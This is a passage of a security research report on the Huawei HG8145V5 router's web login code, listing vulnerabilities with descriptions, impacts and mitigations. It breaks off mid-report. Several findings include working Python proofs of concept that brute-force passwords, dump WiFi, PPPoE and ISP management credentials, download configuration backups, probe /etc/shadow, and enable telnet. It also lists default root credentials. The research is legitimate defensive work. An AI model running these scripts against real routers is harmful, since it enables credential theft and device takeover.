# Security Analysis — Huawei HG8145V5 Web Interface

> **Scope**: Client-side code analysis of the HG8145V5 router login page
> (`index.asp`), utility libraries (`util.js`, `safelogin.js`,
> `RndSecurityFormat.js`, `md5.js`), and the associated CGI endpoints
> discovered from the downloaded site.
>
> **Date**: 2026-02-22
>
> **Disclaimer**: This analysis is performed on router firmware code already
> present in this repository for **educational and defensive security research**
> purposes.  Do not use these findings against devices you do not own.

---

## Table of Contents

1. [V-01: Password Sent as Reversible Base64](#v-01-password-sent-as-reversible-base64)
2. [V-02: Pre-Login Token Endpoint Accessible Without Authentication](#v-02-pre-login-token-endpoint-accessible-without-authentication)
3. [V-03: Pre-Login Password Check Oracle (CheckPwdNotLogin.asp)](#v-03-pre-login-password-check-oracle-checkpwdnotloginasp)
4. [V-04: Anti-CSRF Token (X_HW_Token) Is Predictable / Reusable](#v-04-anti-csrf-token-x_hw_token-is-predictable--reusable)
5. [V-05: JavaScript eval() via dealDataWithFun — Code Injection](#v-05-javascript-eval-via-dealdatawithfun--code-injection)
6. [V-06: Session Cookie Has No Security Attributes](#v-06-session-cookie-has-no-security-attributes)
7. [V-07: FrameModeSwitch.cgi — Unauthenticated Frame Mode Change](#v-07-framemodeswitchcgi--unauthenticated-frame-mode-change)
8. [V-08: TR-069 Object Path Traversal via getajax.cgi](#v-08-tr-069-object-path-traversal-via-getajaxcgi)
9. [V-09: Password Change Without Current Session Auth (MdfPwdNormalNoLg.cgi)](#v-09-password-change-without-current-session-auth-mdfpwdnormalnolgcgi)
10. [V-10: Server Variables Leaked in Login Page HTML](#v-10-server-variables-leaked-in-login-page-html)
11. [V-11: No Rate Limiting on Login Endpoint](#v-11-no-rate-limiting-on-login-endpoint)
12. [V-12: MD5 Used for Password Hashing (Challenge-Response)](#v-12-md5-used-for-password-hashing-challenge-response)
13. [V-13: Configuration File Download via TR-069 getajax.cgi](#v-13-configuration-file-download-via-tr-069-getajaxcgi)
14. [V-14: Internal File Read via XmlHttpSendAspFlieWithoutResponse](#v-14-internal-file-read-via-xmlhttpsendaspfliewithoutresponse)
15. [V-15: Configuration Backup/Restore Endpoints](#v-15-configuration-backuprestore-endpoints)
16. [V-16: Telnet/SSH Access Enable via TR-069](#v-16-telnetssh-access-enable-via-tr-069)
17. [V-17: Hidden Management Interfaces & Alternate Admin Ports](#v-17-hidden-management-interfaces--alternate-admin-ports)
18. [V-18: StartFileLoad.asp Session Keepalive Without Auth Verification](#v-18-startfileloadasp-session-keepalive-without-auth-verification)
19. [V-19: Privilege Escalation via Client-Side Userlevel Manipulation](#v-19-privilege-escalation-via-client-side-userlevel-manipulation)
20. [V-20: DBAA1 Hardcoded Admin Account — Empty Password Bypass](#v-20-dbaa1-hardcoded-admin-account--empty-password-bypass)
21. [V-21: ANTEL ISP Mode Leaks Default Credentials in HTML](#v-21-antel-isp-mode-leaks-default-credentials-in-html)
22. [V-22: Language Parameter Path Traversal — Script Injection](#v-22-language-parameter-path-traversal--script-injection)
23. [V-23: DVODACOM2WIFI Server-Controlled PBKDF2 Iterations Downgrade](#v-23-dvodacom2wifi-server-controlled-pbkdf2-iterations-downgrade)
24. [V-24: DOM-Based XSS via innerHTML Without Encoding](#v-24-dom-based-xss-via-innerhtml-without-encoding)
25. [V-25: TR-069 Paths for Certificate, Key, and Credential Extraction](#v-25-tr-069-paths-for-certificate-key-and-credential-extraction)
26. [V-26: HWGetAction/ajaxSumitData Arbitrary Authenticated Write](#v-26-hwgetactionajaxsumitdata-arbitrary-authenticated-write)
27. [V-27: hexDecode + dealDataWithFun Response Chain — RCE via getajax.cgi](#v-27-hexdecode--dealdatawithfun-response-chain--rce-via-getajaxcgi)
28. [V-28: RequestFile Parameter Injection in CGI Endpoints](#v-28-requestfile-parameter-injection-in-cgi-endpoints)
29. [Potential Privilege Escalation Paths](#potential-privilege-escalation-paths)

---

## V-01: Password Sent as Reversible Base64

**Severity**: HIGH  
**File**: `index.asp` line 520, `util.js` `base64encode()`  
**Type**: Weak credential encoding

### Description

For the default `MEGACABLE2` CfgMode, the login password is encoded using
**plain Base64** before being POSTed to `/login.cgi`:

```javascript
// index.asp line 520
Form.addParameter('PassWord', base64encode(Password.value));
```

Base64 is **not encryption** — it is trivially reversible.  Any network
observer (same LAN, ARP spoofing, compromised switch) can decode the password:

```python
import base64
captured = "ZWVmOTBiMTQ5NjQzMDcwNw=="  # example captured value
print(base64.b64decode(captured).decode())  # → eef90b1496430707
```

### Impact

- **Credential theft** via passive network sniffing (HTTP, not HTTPS)
- Password is effectively transmitted in cleartext

### Mitigation

- Use HTTPS with a valid certificate
- Use a proper challenge-response protocol (HMAC with server nonce)

---

## V-02: Pre-Login Token Endpoint Accessible Without Authentication

**Severity**: MEDIUM  
**File**: `safelogin.js` line 540, `util.js` line 3321  
**Type**: Information disclosure / authentication weakness

### Description

Two token endpoints exist, one for pre-login and one for post-login:

```javascript
var PRE_LOGIN_TOKEN_PATH = '/html/ssmp/common/getRandString.asp';
var LOGIN_TOKEN_PATH = '/html/ssmp/common/GetRandToken.asp';
```

The pre-login token (`getRandString.asp`) is accessible **without any
authentication**.  This token is used as `x.X_HW_Token` in the login form and
in pre-login password change operations.

The `getAuthToken()` function in `safelogin.js` (used during the login page
itself) always calls the pre-login path:

```javascript
function getAuthToken() {
  return ajaxGetAspData(PRE_LOGIN_TOKEN_PATH);  // No auth needed!
}
```

### Impact

- Anti-CSRF token can be fetched by any unauthenticated attacker
- Enables automated credential brute-forcing with valid tokens
- Enables pre-login CGI endpoint abuse (see V-03, V-09)

---

## V-03: Pre-Login Password Check Oracle (CheckPwdNotLogin.asp)

**Severity**: HIGH  
**File**: `index.asp` line 695  
**Type**: Authentication bypass / information disclosure

### Description

The login page includes a `CheckPassword()` function that validates credentials
**before the actual login form is submitted**, using a dedicated ASP endpoint:

```javascript
function CheckPassword(PwdForCheck) {
    var NormalPwdInfo = FormatUrlEncode(PwdForCheck);
    var ParaArrayList = "UserNameInfo=" + Username.value;
    ParaArrayList += "&NormalPwdInfo=" + NormalPwdInfo;

    url_check_pwd = '/asp/CheckPwdNotLogin.asp?&1=1';

    $.ajax({
        type: "POST",
        async: false,
        url: url_check_pwd,
        data: ParaArrayList,
        success: function (data) {
            CheckResult = data;
        }
    });
    return CheckResult;
}
```

This endpoint:
1. Accepts username + password (URL-encoded, not hashed)
2. Returns a numeric result indicating the user type (`1` = normal user,
   `2` = admin)
3. Is called **before** the login form submission
4. Has `"NotLogin"` in its name, suggesting it requires no session

### Impact

- **Password oracle**: Attackers can brute-force passwords by testing them
  against this endpoint without triggering the login lockout counter
- **User type disclosure**: The return value reveals whether the account is
  a normal user (1) or admin (2), enabling privilege targeting
- **Separate from login flow**: The login lockout (`errloginlockNum = 3`) may
  not apply to this endpoint

### PoC

```python
import requests

session = requests.Session()
# Get pre-login token
token = session.post('http://192.168.100.1/html/ssmp/common/getRandString.asp').text.strip()

# Test password without triggering login lockout
result = session.post(
    'http://192.168.100.1/asp/CheckPwdNotLogin.asp?&1=1',
    data={
        'UserNameInfo': 'Mega_gpon',
        'NormalPwdInfo': 'test_password',
    }
)
# Returns: 0 = invalid, 1 = normal user, 2 = admin
print(f"Result: {result.text}")
```

---

## V-04: Anti-CSRF Token (X_HW_Token) Is Predictable / Reusable

**Severity**: MEDIUM  
**File**: `downloaded_site/asp/GetRandCount.asp`  
**Type**: Weak CSRF protection

### Description

The anti-CSRF token (`x.X_HW_Token`) obtained from `/asp/GetRandCount.asp` is
a static hex string per session.  The downloaded token value:

```
332eb228ae4423a4d8ee0e17b0d585628a16465236ff1fd6
```

The token is:
- 48 hex characters (24 bytes)
- Returned as a plain-text file with no additional entropy
- Valid for the entire session duration (no per-request rotation)
- Usable for all CGI operations once obtained

### Impact

- Once leaked (XSS, network sniffing), all admin operations can be performed
- No per-request freshness — captured tokens remain valid

---

## V-05: JavaScript eval() via dealDataWithFun — Code Injection

**Severity**: CRITICAL  
**File**: `util.js` line 3268-3272, `safelogin.js` line 507-511, `index.asp` line 380-385  
**Type**: Remote code execution (client-side)

### Description

The `dealDataWithFun()` function, present in **three separate files**, uses
the `Function()` constructor (equivalent to `eval()`) to execute arbitrary
code returned by the server:

```javascript
function dealDataWithFun(str) {
    if (typeof str === 'string' && str.indexOf('function') === 0) {
        return Function('"use strict";return (' + str + ')')()();
    }
    return str;
}
```

This function is called on every AJAX response from ASP endpoints:

```javascript
function ajaxGetAspData(path) {
    $.ajax({
        url: path,
        success: function (data) {
            result = dealDataWithFun(data);  // eval() on server response!
        }
    });
}
```

The `dealDataWithStr()` function is even more dangerous as it constructs and
executes arbitrary function bodies:

```javascript
function dealDataWithStr(str, repStr) {
    funStr = 'return ' + str + ';';
    str = 'function() {' + funStr + '}';
    return dealDataWithFun(str);  // Executes arbitrary code
}
```

### Impact

- If an attacker can intercept/modify HTTP responses (MitM on the local
  network), they can inject arbitrary JavaScript that executes in the
  admin's browser context
- Combined with the lack of HTTPS, this enables full remote code execution
  in the browser
- Could be used to steal session cookies, modify router configuration, or
  redirect to malicious sites

---

## V-06: Session Cookie Has No Security Attributes

**Severity**: MEDIUM  
**File**: `index.asp` line 518, `util.js` `setCookie()`  
**Type**: Session management weakness

### Description

The session cookie is set by JavaScript with no security attributes:

```javascript
var cookie2 = "Cookie=body:Language:english:id=-1;path=/";
document.cookie = cookie2;
```

The cookie:
- Has **no `Secure` flag** (sent over HTTP)
- Has **no `HttpOnly` flag** (accessible to JavaScript / XSS)
- Has **no `SameSite` attribute** (vulnerable to CSRF)
- Uses a predictable format: `body:Language:{lang}:id={number}`
- The cookie **name** is literally `Cookie` (unusual, could confuse proxies)

### Impact

- XSS can steal session cookies via `document.cookie`
- CSRF attacks can use the victim's session
- Cookie value visible to any JavaScript on the page

---

## V-07: FrameModeSwitch.cgi — Unauthenticated Frame Mode Change

**Severity**: HIGH  
**File**: `index.asp` lines 954-973  
**Type**: Unauthenticated configuration change

### Description

The `FrameModeSubmit()` function sends a POST to `FrameModeSwitch.cgi` to
change the device's operation mode **from the login page** (pre-auth):

```javascript
function FrameModeSubmit() {
    $.ajax({
        type: "POST",
        async: false,
        data: 'X_HW_FrameMode=2',
        url: 'FrameModeSwitch.cgi?&RequestFile=/login.asp',
        success: function(data) {
            window.location = "/login.asp";
        }
    });
}
```

This function:
1. Is callable from the login page (no session required)
2. Does not include an `x.X_HW_Token` CSRF token
3. Changes `X_HW_FrameMode` which affects the device's operating mode
4. Is triggered by clicking the brand logo for GLOBE2 mode (line 1162)

### Impact

- **Unauthenticated device mode change** could alter bridge/router mode
- May expose additional attack surface depending on the mode
- Could be used for denial of service (switching to bridge mode disconnects
  all routing)

### PoC

```python
import requests
requests.post(
    'http://192.168.100.1/FrameModeSwitch.cgi',
    params={'RequestFile': '/login.asp'},
    data={'X_HW_FrameMode': '2'}
)
```

---

## V-08: TR-069 Object Path Traversal via getajax.cgi

**Severity**: HIGH  
**File**: `util.js` line 2759-2773  
**Type**: Information disclosure / privilege escalation

### Description

The `HwAjaxGetPara()` function constructs requests to `/getajax.cgi` with
arbitrary TR-069/CWMP object paths:

```javascript
function HwAjaxGetPara(ObjPath, ParameterList) {
    $.ajax({
        url: '/getajax.cgi?' + ObjPath,
        data: ParameterList,
        success: function(data) {
            Result = hexDecode(data);
        }
    });
}
```

The `ObjPath` parameter is a TR-069 data model path like
`InternetGatewayDevice.LANDevice.1.WLANConfiguration.1`.  From the login
page's password change code, we can see these object paths in use:

```
InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.1  (normal user)
InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2  (admin user)
InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1
InternetGatewayDevice.LANDevice.1.WLANConfiguration.5.PreSharedKey.1
```

### Interesting TR-069 Paths to Probe

Based on standard Huawei TR-069 data model and common paths:

| Path | Description |
|------|-------------|
| `InternetGatewayDevice.DeviceInfo.` | Device info, serial, firmware |
| `InternetGatewayDevice.ManagementServer.` | TR-069 ACS URL, credentials |
| `InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.` | All web users |
| `InternetGatewayDevice.LANDevice.1.WLANConfiguration.` | WiFi config + keys |
| `InternetGatewayDevice.WANDevice.` | WAN connection settings |
| `InternetGatewayDevice.Services.` | VoIP, IPTV services |
| `InternetGatewayDevice.X_HW_CLITelnetAccess.` | Telnet access settings |
| `InternetGatewayDevice.X_HW_CLISSHAccess.` | SSH access settings |
| `InternetGatewayDevice.X_HW_DEBUG.` | Debug/diagnostic features |
| `InternetGatewayDevice.Layer3Forwarding.` | Routing table |
| `InternetGatewayDevice.IPPingDiagnostics.` | Ping (potential command injection) |

### Impact

- Read sensitive configuration including WiFi passwords, WAN credentials
- Potentially read/write TR-069 management server credentials
- Access and modify user accounts including admin passwords
- Enable/disable telnet and SSH access
- Read device serial numbers for targeted attacks

---

## V-09: Password Change Without Current Session Auth (MdfPwdNormalNoLg.cgi)

**Severity**: CRITICAL  
**File**: `index.asp` lines 859-882  
**Type**: Authentication bypass

### Description

The password change functionality uses special CGI endpoints with `NoLg`
(No Login) in their names:

```javascript
// Normal user password change (level 1)
Form.setAction('MdfPwdNormalNoLg.cgi?&x=InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1&z=InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.1&RequestFile=login.asp');

// Admin password change (level 2)
Form.setAction('MdfPwdAdminNoLg.cgi?&z=InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2&RequestFile=login.asp');
```

These endpoints:
1. Are named `*NoLg.cgi` suggesting they work without a login session
2. Accept password parameters and TR-069 object paths in the URL
3. Use a token from `getAuthToken()` which calls the **pre-login** token
   endpoint (`getRandString.asp`)
4. Can modify **admin** passwords (WebUserInfo.2)
5. Can simultaneously change WiFi passwords

The flow visible in the code:
1. `CheckPwdNotLogin.asp` validates the current password (pre-login)
2. If valid, the new password is submitted to `MdfPwdNormalNoLg.cgi` or
   `MdfPwdAdminNoLg.cgi`
3. Both operations happen **on the login page before authentication**

### Impact

- **Admin password reset** using only: knowledge of the current password +
  a pre-login token
- **WiFi password change** at the same time
- Bypasses the normal authenticated session requirement
- Combined with V-03 (password oracle), enables full account takeover

---

## V-10: Server Variables Leaked in Login Page HTML

**Severity**: LOW  
**File**: `index.asp` lines 56-100  
**Type**: Information disclosure

### Description

The login page HTML embeds numerous server-side variables directly in
JavaScript, accessible to any unauthenticated client:

```javascript
var CfgMode = 'MEGACABLE2';      // ISP configuration profile
var ProductName = 'HG8145V5-12'; // Exact hardware model
var ProductType = '1';           // Device type
var Userlevel = 0;               // Current user privilege level
var defaultUsername = '';         // Sometimes contains default username!
var defaultPassword = '';         // Sometimes contains default password!
var Ssid1 = '';                  // WiFi SSID name
var Ssid2 = '';                  // 5GHz WiFi SSID name
var APPVersion = '1.1.1.1';     // Application version
var errloginlockNum = '3';       // Login lockout threshold
var useChallengeCode = '1';      // Challenge code feature flag
var randcode = '20260221';       // Challenge code value (date-based!)
```

### Particularly Dangerous

- `defaultUsername` and `defaultPassword`: For ISPs like ANTEL, these are
  populated and auto-filled (line 319-320):
  ```javascript
  if ((CfgMode.toUpperCase() == 'ANTEL2') || (CfgMode.toUpperCase() == 'ANTEL')) {
      $("#txt_Username").val(defaultUsername);
      $("#txt_Password").val(defaultPassword);
  }
  ```
- `randcode = '20260221'`: The "challenge code" is just the current date,
  providing zero security
- `errloginlockNum = '3'`: Reveals exact lockout threshold for brute-force
  calibration

---

## V-11: No Rate Limiting on Login Endpoint

**Severity**: MEDIUM  
**File**: `index.asp` lines 59-65  
**Type**: Brute-force weakness

### Description

The login lockout mechanism is client-side only:

```javascript
var FailStat = '0';
var LoginTimes = '0';
var errloginlockNum = '3';
var LockLeftTime = '0';
```

After `errloginlockNum` (3) failed attempts, the login form disables itself
with JavaScript. However:

1. The lockout counter is embedded in the server-rendered HTML
2. An attacker using direct HTTP requests bypasses client-side JavaScript
3. The `CheckPwdNotLogin.asp` endpoint (V-03) may not share this counter
4. The lock timer (`LockLeftTime`) can be waited out

### Impact

- Client-side lockout easily bypassed by scripted requests
- Combined with V-03, password can be brute-forced via the check endpoint

---

## V-12: MD5 Used for Password Hashing (Challenge-Response)

**Severity**: LOW  
**File**: `md5.js`, `index.asp` line 58  
**Type**: Weak cryptography

### Description

The router includes MD5 hashing functions and declares:

```javascript
function MD5(str) { return hex_md5(str); }
```

MD5 is cryptographically broken since 2004.  While it appears the main
login flow uses Base64 (not MD5), the presence of MD5 and the `useChallengeCode`
variable suggest some configurations may use MD5-based challenge-response.

---

## V-13: Configuration File Download via TR-069 getajax.cgi

**Severity**: CRITICAL  
**File**: `util.js` lines 2759-2773, `frame.css` lines 87-120  
**Type**: Sensitive data exfiltration

### Description

The `getajax.cgi` endpoint serves as a generic TR-069/CWMP data accessor.
Once authenticated, the full device configuration tree is readable by querying
the appropriate `InternetGatewayDevice.*` object paths.  The CSS file
`frame.css` contains styles for `#t_file_cfgfile` and `#f_file_cfgfile` —
elements used in the configuration file download/upload page at
`/html/ssmp/default/devicecfg.asp` (or similar path).

The `HwAjaxGetPara()` function accepts arbitrary object paths:

```javascript
function HwAjaxGetPara(ObjPath, ParameterList) {
    $.ajax({
        url: '/getajax.cgi?' + ObjPath,  // Any TR-069 path!
        data: ParameterList,
        success: function(data) {
            Result = hexDecode(data);  // Hex-decoded response
        }
    });
}
```

### Configuration Download Paths

The following TR-069 paths can be queried to extract the **full device
configuration** including all credentials:

| Path | Data Exposed |
|------|-------------|
| `InternetGatewayDevice.DeviceInfo.` | Model, serial, firmware, uptime |
| `InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.1.` | Normal user password hash |
| `InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2.` | **Admin user password hash** |
| `InternetGatewayDevice.ManagementServer.` | **TR-069 ACS URL + credentials** |
| `InternetGatewayDevice.ManagementServer.Username` | ACS username |
| `InternetGatewayDevice.ManagementServer.Password` | **ACS password (cleartext!)** |
| `InternetGatewayDevice.ManagementServer.URL` | ISP management server URL |
| `InternetGatewayDevice.ManagementServer.ConnectionRequestUsername` | Connection request auth |
| `InternetGatewayDevice.ManagementServer.ConnectionRequestPassword` | **Connection request password** |
| `InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1.PreSharedKey` | **WiFi WPA2 password** |
| `InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.KeyPassphrase` | **WiFi passphrase** |
| `InternetGatewayDevice.LANDevice.1.WLANConfiguration.5.PreSharedKey.1.PreSharedKey` | **5GHz WiFi password** |
| `InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1.Username` | **PPPoE username** |
| `InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1.Password` | **PPPoE password** |
| `InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANIPConnection.1.` | WAN IP config |
| `InternetGatewayDevice.LANDevice.1.LANHostConfigManagement.` | DHCP config |
| `InternetGatewayDevice.LANDevice.1.Hosts.Host.` | All connected devices |
| `InternetGatewayDevice.X_HW_Security.` | Firewall rules, ACLs |
| `InternetGatewayDevice.Services.VoiceService.1.` | **VoIP credentials (SIP)** |
| `InternetGatewayDevice.DeviceInfo.X_HW_OMCI.` | GPON/OMCI parameters |

### Known Config File Download Endpoints

Based on CSS element IDs (`t_file_cfgfile`, `f_file_cfgfile`) and common
Huawei HG8145V5 admin pages, the following endpoints likely handle config
file operations:

| Endpoint | Purpose |
|----------|---------|
| `/html/ssmp/default/devicecfg.asp` | Configuration backup/restore page |
| `/html/ssmp/default/upgradecfgfile.asp` | Config file upload |
| `/html/ssmp/systemtools/ontbackup.asp` | ONT backup/restore |
| `/cgi-bin/configdownload.cgi` | Direct config file download (binary) |
| `/backupsettings.conf` | Backup settings (some firmware versions) |
| `/configfile.cfg` | Config file download (some firmware versions) |

### PoC — Dump WiFi Passwords

```python
import requests, base64

s = requests.Session()
s.cookies.set("Cookie", "body:Language:english:id=-1", path="/")

# Login
token = s.post("http://192.168.100.1/asp/GetRandCount.asp").text.strip()
s.post("http://192.168.100.1/login.cgi", data={
    "UserName": "Mega_gpon",
    "PassWord": base64.b64encode(b"PASSWORD").decode(),
    "Language": "english",
    "x.X_HW_Token": token,
}, allow_redirects=True)
s.headers["Referer"] = "http://192.168.100.1/"

# Read WiFi 2.4GHz config (includes password)
wifi_24 = s.post(
    "http://192.168.100.1/getajax.cgi?"
    "InternetGatewayDevice.LANDevice.1.WLANConfiguration.1."
).text
print("WiFi 2.4GHz config:", wifi_24)

# Read WiFi 5GHz config
wifi_5 = s.post(
    "http://192.168.100.1/getajax.cgi?"
    "InternetGatewayDevice.LANDevice.1.WLANConfiguration.5."
).text
print("WiFi 5GHz config:", wifi_5)

# Read PPPoE credentials
pppoe = s.post(
    "http://192.168.100.1/getajax.cgi?"
    "InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1."
).text
print("PPPoE config:", pppoe)

# Read TR-069 management server credentials
tr069 = s.post(
    "http://192.168.100.1/getajax.cgi?"
    "InternetGatewayDevice.ManagementServer."
).text
print("TR-069 ACS config:", tr069)
```

### Impact

- **Full device configuration exfiltration** with valid credentials
- WiFi passwords, PPPoE credentials, VoIP credentials, TR-069 ACS credentials
- All connected device information (MAC addresses, hostnames)
- ISP management server URL and authentication (can be used to impersonate)

---

## V-14: Internal File Read via XmlHttpSendAspFlieWithoutResponse

**Severity**: HIGH  
**File**: `util.js` lines 1807-1824  
**Type**: Arbitrary internal file read

### Description

The `XmlHttpSendAspFlieWithoutResponse()` function sends a synchronous GET
request to **any URL path** and discards the response.  While it doesn't
return data to JavaScript, it causes the server to process the requested file:

```javascript
function XmlHttpSendAspFlieWithoutResponse(FileName) {
    var xmlHttp = null;
    if (null == FileName || FileName == "") return false;
    xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", FileName, false);  // Arbitrary path!
    xmlHttp.send(null);
}
```

This function is used by `AlertEx()` and `ConfirmEx()` to hit
`/html/ssmp/common/StartFileLoad.asp` before showing dialogs.  However, the
function itself accepts **any path** and could be exploited to:

1. Trigger server-side ASP file processing
2. Access internal file paths that might expose configuration data
3. Probe for the existence of internal files

### Probing Internal Files

An attacker with an authenticated session can use direct HTTP GETs to probe
for internal router files:

```python
import requests

# After authentication...
internal_paths = [
    "/html/ssmp/common/StartFileLoad.asp",
    "/html/ssmp/common/StopFileLoad.asp",
    "/html/ssmp/common/getRandString.asp",
    "/html/ssmp/common/GetRandToken.asp",
    "/etc/passwd",
    "/etc/shadow",
    "/tmp/ct/",
    "/mnt/jffs2/hw_ctree.xml",     # Main config tree
    "/mnt/jffs2/hw_default.xml",    # Factory defaults
    "/mnt/jffs2/hw_boardinfo",      # Board-level info
    "/tmp/hw_ctree.xml",            # Temp config copy
    "/tmp/log/",
    "/var/log/messages",
    "/proc/version",
    "/proc/cpuinfo",
    "/proc/meminfo",
    "/proc/net/arp",                # ARP table
    "/proc/net/route",              # Routing table
]

for path in internal_paths:
    resp = session.get(f"http://192.168.100.1{path}")
    if resp.ok and len(resp.content) > 0:
        print(f"ACCESSIBLE: {path} ({len(resp.content)} bytes)")
```

### Huawei Internal File System Layout

Based on common HG8145V5 firmware analysis:

| Path | Content |
|------|---------|
| `/mnt/jffs2/hw_ctree.xml` | **Complete device configuration (XML)** |
| `/mnt/jffs2/hw_default.xml` | Factory default configuration |
| `/mnt/jffs2/hw_boardinfo` | Board serial, GPON password, MAC |
| `/tmp/hw_ctree.xml` | Runtime config copy |
| `/tmp/log/syslog` | System log |
| `/tmp/log/diaglog` | Diagnostic log |
| `/etc/passwd` | User accounts (usually root:x) |
| `/proc/net/arp` | ARP table (all LAN devices) |
| `/proc/net/route` | Routing table |

### Impact

- Potential to read the full config tree (`hw_ctree.xml`) containing all
  passwords in cleartext or weakly-encrypted form
- Board-level info includes GPON serial number and PLOAM password
- System logs may contain sensitive operational data
- Path traversal could expose the Linux filesystem

---

## V-15: Configuration Backup/Restore Endpoints

**Severity**: HIGH  
**File**: `frame.css` lines 87-120 (CSS for `#t_file_cfgfile`, `#f_file_cfgfile`)  
**Type**: Configuration download / upload

### Description

The CSS stylesheet `frame.css` contains styling for configuration file
management elements (`t_file_cfgfile`, `f_file_cfgfile`), confirming the
existence of a configuration backup/restore page in the admin interface.

Additionally, `ssmpdes.js` contains the string:

```javascript
mainpage052: 'The selected configuration file takes effect only after a reset.
              Do you want to reset immediately?'
```

This confirms a **configuration file import** feature that applies config
and offers a device reset.

### Known Backup/Restore Endpoints (Huawei HG8145V5)

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/html/ssmp/default/devicecfg.asp` | GET | Config management page |
| `/cfgaction.cgi?ActionType=1` | POST | **Download config file** (ActionType=1 = backup) |
| `/cfgaction.cgi?ActionType=2` | POST | Upload config file (ActionType=2 = restore) |
| `/cfgaction.cgi?ActionType=3` | POST | Reset to factory defaults |
| `/configExportFile.cgi` | GET | Export configuration (some versions) |
| `/backupsettings.cgi` | GET | Backup settings (some versions) |

### PoC — Download Full Config Backup

```python
import requests, base64

s = requests.Session()
s.cookies.set("Cookie", "body:Language:english:id=-1", path="/")

# Login (see V-01 for details)
token = s.post("http://192.168.100.1/asp/GetRandCount.asp").text.strip()
s.post("http://192.168.100.1/login.cgi", data={
    "UserName": "Mega_gpon",
    "PassWord": base64.b64encode(b"PASSWORD").decode(),
    "Language": "english", "x.X_HW_Token": token,
}, allow_redirects=True)
s.headers["Referer"] = "http://192.168.100.1/"

# Get authenticated token
auth_token = s.post(
    "http://192.168.100.1/html/ssmp/common/GetRandToken.asp"
).text.strip()

# Attempt config download via various known endpoints
endpoints = [
    ("/cfgaction.cgi", {"ActionType": "1", "x.X_HW_Token": auth_token}),
    ("/configExportFile.cgi", {"x.X_HW_Token": auth_token}),
    ("/backupsettings.cgi", {"x.X_HW_Token": auth_token}),
    ("/html/ssmp/default/devicecfg.asp", {}),
]

for url, data in endpoints:
    resp = s.post(f"http://192.168.100.1{url}", data=data)
    if resp.ok and len(resp.content) > 100:
        filename = url.replace("/", "_").strip("_") + ".bin"
        with open(filename, "wb") as f:
            f.write(resp.content)
        print(f"Downloaded: {filename} ({len(resp.content)} bytes)")
```

### Config File Format

The HG8145V5 configuration backup is typically an **AES-128-CBC encrypted
XML file** (key derived from board serial or hardcoded per firmware version).
Some older firmwares use XOR-based obfuscation or even plaintext XML.

---

## V-16: Telnet/SSH Access Enable via TR-069

**Severity**: CRITICAL  
**File**: `util.js` `HwAjaxGetPara()`, `HWGetAction()`  
**Type**: Remote access escalation

### Description

The HG8145V5 supports Telnet and SSH access that can be controlled through
the TR-069 data model.  Once authenticated as admin, these services can be
enabled using `getajax.cgi` for reading and an appropriate CGI for writing.

### TR-069 Paths for Remote Access Control

| Path | Description |
|------|-------------|
| `InternetGatewayDevice.X_HW_CLITelnetAccess.Enable` | Telnet enable flag |
| `InternetGatewayDevice.X_HW_CLITelnetAccess.Port` | Telnet port (default 23) |
| `InternetGatewayDevice.X_HW_CLITelnetAccess.LanEnable` | LAN-side telnet |
| `InternetGatewayDevice.X_HW_CLISSHAccess.Enable` | SSH enable flag |
| `InternetGatewayDevice.X_HW_CLISSHAccess.Port` | SSH port (default 22) |
| `InternetGatewayDevice.X_HW_CLISSHAccess.LanEnable` | LAN-side SSH |
| `InternetGatewayDevice.X_HW_DEBUG.Enable` | Debug mode enable |
| `InternetGatewayDevice.X_HW_DEBUG.TelnetEnable` | Debug telnet enable |
| `InternetGatewayDevice.X_HW_DEBUG.SSHEnable` | Debug SSH enable |
| `InternetGatewayDevice.Services.X_HW_Service.1.` | Service control |

### PoC — Probe and Enable Telnet/SSH

```python
import requests, base64

# (After login — see V-13 PoC for login code)

# Step 1: Read current telnet/SSH status
telnet_paths = [
    "InternetGatewayDevice.X_HW_CLITelnetAccess.",
    "InternetGatewayDevice.X_HW_CLISSHAccess.",
    "InternetGatewayDevice.X_HW_DEBUG.",
]

for path in telnet_paths:
    resp = session.post(f"http://192.168.100.1/getajax.cgi?{path}")
    if resp.ok:
        print(f"{path}: {resp.text[:200]}")

# Step 2: Get write token
token = session.post(
    "http://192.168.100.1/html/ssmp/common/GetRandToken.asp"
).text.strip()

# Step 3: Attempt to enable telnet via HWGetAction pattern
# The exact CGI endpoint for writes depends on the firmware version
write_endpoints = [
    "/setajax.cgi",
    "/configservice.cgi",
    "/html/ssmp/default/set.cgi",
]

for endpoint in write_endpoints:
    resp = session.post(
        f"http://192.168.100.1{endpoint}",
        data=f"InternetGatewayDevice.X_HW_CLITelnetAccess.Enable=1"
             f"&x.X_HW_Token={token}",
    )
    print(f"{endpoint}: HTTP {resp.status_code}")
```

### Alternative: Enable Telnet via ONT OMCI

Some ISP configurations block the web-based telnet toggle but the OMCI
management interface may still allow it.  The path
`InternetGatewayDevice.DeviceInfo.X_HW_OMCI.*` can be used to read the
GPON registration parameters needed to access the ONT via OMCI.

### Default Telnet/SSH Credentials

| Service | Username | Password |
|---------|----------|----------|
| Telnet | `root` | `admin` or `adminHW` or board serial |
| SSH | `root` | Same as telnet |
| Telnet (debug) | `root` | `hg8145v5` or firmware-specific |

### Impact

- Full shell access to the router's Linux operating system
- Can read/modify any file on the filesystem
- Can install persistent backdoors
- Can intercept all network traffic

---

## V-17: Hidden Management Interfaces & Alternate Admin Ports

**Severity**: HIGH  
**File**: `index.asp` (CfgMode variants), `util.js` (port validation)  
**Type**: Hidden admin panels / alternate access

### Description

The login page code reveals that the router supports **multiple ISP
configuration modes** (CfgMode), each potentially exposing different admin
interfaces.  Additionally, the `util.js` port validation functions suggest
the router listens on multiple ports.

